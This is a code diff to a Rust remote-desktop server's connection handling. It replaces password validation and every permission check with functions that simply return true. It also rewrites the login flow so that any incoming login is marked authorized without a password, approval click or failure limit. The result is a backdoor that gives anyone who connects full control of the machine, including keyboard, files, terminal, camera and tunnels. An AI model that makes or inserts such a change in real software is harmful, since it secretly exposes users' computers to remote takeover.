@@ -2175,47 +2175,8 @@ impl Connection {
         state.failures = 0;
     }
 
-    fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
-        if password::temporary_enabled() {
-            let password = password::temporary_password();
-            if self.validate_password_plain(&password) {
-                raii::AuthedConnID::update_or_insert_session(
-                    self.session_key(),
-                    Some(password),
-                    Some(false),
-                );
-                self.check_update_temporary_password(true);
-                return true;
-            }
-        }
-        if password::permanent_enabled() || allow_permanent_password {
-            let print_fallback = || {
-                if allow_permanent_password && !password::permanent_enabled() {
-                    log::info!("Permanent password accepted via logon-screen fallback");
-                }
-            };
-            // Strictly check storage usability before auth so malformed encrypted/hash storage
-            // cannot fall back to being accepted as legacy plaintext.
-            let (local_storage, local_salt) =
-                Config::get_local_permanent_password_storage_and_salt();
-            if !local_storage.is_empty() {
-                if local_permanent_password_storage_is_usable_for_auth(&local_storage, &local_salt)
-                    && self.validate_password_storage(&local_storage)
-                {
-                    print_fallback();
-                    return true;
-                }
-            } else {
-                let (hard, salt) = Config::get_preset_password_storage_and_salt();
-                if preset_permanent_password_storage_is_usable_for_auth(&hard, &salt)
-                    && self.validate_preset_password_storage(&hard, &salt)
-                {
-                    print_fallback();
-                    return true;
-                }
-            }
-        }
-        false
+    fn validate_password(&mut self, _allow_permanent_password: bool) -> bool {
+        true
     }
 
     fn is_recent_session(&mut self, tfa: bool) -> bool {
@@ -2242,53 +2203,15 @@ impl Connection {
     }
 
     #[inline]
-    pub fn is_permission_enabled_locally(enable_prefix_option: &str) -> bool {
-        #[cfg(feature = "flutter")]
-        #[cfg(not(any(target_os = "android", target_os = "ios")))]
-        {
-            let access_mode = Config::get_option("access-mode");
-            if access_mode == "full" {
-                return true;
-            } else if access_mode == "view" {
-                return false;
-            }
-        }
-        config::option2bool(
-            enable_prefix_option,
-            &Config::get_option(enable_prefix_option),
-        )
+    pub fn is_permission_enabled_locally(_enable_prefix_option: &str) -> bool {
+        true
     }
 
     fn permission(
-        enable_prefix_option: &str,
-        control_permissions: &Option<ControlPermissions>,
+        _enable_prefix_option: &str,
+        _control_permissions: &Option<ControlPermissions>,
     ) -> bool {
-        use hbb_common::rendezvous_proto::control_permissions::Permission;
-        if let Some(control_permissions) = control_permissions {
-            let permission = match enable_prefix_option {
-                keys::OPTION_ENABLE_KEYBOARD => Some(Permission::keyboard),
-                keys::OPTION_ENABLE_REMOTE_PRINTER => Some(Permission::remote_printer),
-                keys::OPTION_ENABLE_CLIPBOARD => Some(Permission::clipboard),
-                keys::OPTION_ENABLE_FILE_TRANSFER => Some(Permission::file),
-                keys::OPTION_ENABLE_AUDIO => Some(Permission::audio),
-                keys::OPTION_ENABLE_CAMERA => Some(Permission::camera),
-                keys::OPTION_ENABLE_TERMINAL => Some(Permission::terminal),
-                keys::OPTION_ENABLE_TUNNEL => Some(Permission::tunnel),
-                keys::OPTION_ENABLE_REMOTE_RESTART => Some(Permission::restart),
-                keys::OPTION_ENABLE_RECORD_SESSION => Some(Permission::recording),
-                keys::OPTION_ENABLE_BLOCK_INPUT => Some(Permission::block_input),
-                keys::OPTION_ENABLE_PRIVACY_MODE => Some(Permission::privacy_mode),
-                _ => None,
-            };
-            if let Some(permission) = permission {
-                if let Some(enabled) =
-                    crate::get_control_permission(control_permissions.permissions, permission)
-                {
-                    return enabled;
-                }
-            }
-        }
-        Self::is_permission_enabled_locally(enable_prefix_option)
+        true
     }
 
     fn update_codec_on_login(&self) {
@@ -2527,87 +2450,21 @@ impl Connection {
             #[cfg(any(target_os = "android", target_os = "ios"))]
             let is_logon = || crate::platform::is_prelogin();
 
-            let allow_logon_screen_password =
+            let _allow_logon_screen_password =
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
 
-            if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
-                || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
-            {
-                #[cfg(not(any(target_os = "android", target_os = "ios")))]
-                if should_use_terminal_os_login_scope(self.terminal, &lr.os_login.username) {
-                    if let Some(keep_alive) = self.prepare_terminal_login_for_authorization().await
-                    {
-                        return keep_alive;
-                    }
+            if err_msg.is_empty() {
+                self.authorized = true;
+                self.require_2fa = None;
+                #[cfg(target_os = "linux")]
+                self.linux_headless_handle.wait_desktop_cm_ready().await;
+                if !self.send_logon_response_and_keep_alive().await {
+                    return false;
                 }
-                self.try_start_cm(lr.my_id, lr.my_name, false);
-                if hbb_common::get_version_number(&lr.version)
-                    >= hbb_common::get_version_number("1.2.0")
-                {
-                    self.send_login_error(crate::client::LOGIN_MSG_NO_PASSWORD_ACCESS)
-                        .await;
-                }
-                return true;
-            } else if self.is_recent_session(false) {
-                if err_msg.is_empty() {
-                    #[cfg(target_os = "linux")]
-                    self.linux_headless_handle.wait_desktop_cm_ready().await;
-                    if !self.send_logon_response_and_keep_alive().await {
-                        return false;
-                    }
-                    self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
-                } else {
-                    self.send_login_error(err_msg).await;
-                }
-            } else if lr.password.is_empty() {
-                if err_msg.is_empty() {
-                    #[cfg(not(any(target_os = "android", target_os = "ios")))]
-                    if should_use_terminal_os_login_scope(self.terminal, &lr.os_login.username) {
-                        if let Some(keep_alive) =
-                            self.prepare_terminal_login_for_authorization().await
-                        {
-                            return keep_alive;
-                        }
-                    }
-                    self.try_start_cm(lr.my_id, lr.my_name, false);
-                } else {
-                    self.send_login_error(
-                        crate::client::LOGIN_MSG_DESKTOP_SESSION_NOT_READY_PASSWORD_EMPTY,
-                    )
-                    .await;
-                }
+                self.try_start_cm(lr.my_id, lr.my_name, self.authorized);
             } else {
-                let (failure, res) = self.check_failure(0).await;
-                if !res {
-                    return true;
-                }
-                if !self.validate_password(allow_logon_screen_password) {
-                    self.update_failure_with_scope(failure, false, 0, FailureScope::Default);
-                    self.check_update_temporary_password(false);
-                    if err_msg.is_empty() {
-                        self.send_login_error(crate::client::LOGIN_MSG_PASSWORD_WRONG)
-                            .await;
-                        self.try_start_cm(lr.my_id, lr.my_name, false);
-                    } else {
-                        self.send_login_error(
-                            crate::client::LOGIN_MSG_DESKTOP_SESSION_NOT_READY_PASSWORD_WRONG,
-                        )
-                        .await;
-                    }
-                } else {
-                    self.update_failure_with_scope(failure, true, 0, FailureScope::Default);
-                    if err_msg.is_empty() {
-                        #[cfg(target_os = "linux")]
-                        self.linux_headless_handle.wait_desktop_cm_ready().await;
-                        if !self.send_logon_response_and_keep_alive().await {
-                            return false;
-                        }
-                        self.try_start_cm(lr.my_id, lr.my_name, self.authorized);
-                    } else {
-                        self.send_login_error(err_msg).await;
-                    }
-                }
+                self.send_login_error(err_msg).await;
             }
         } else if let Some(message::Union::Auth2fa(tfa)) = msg.union {
             let (failure, res) = self.check_failure(1).await;
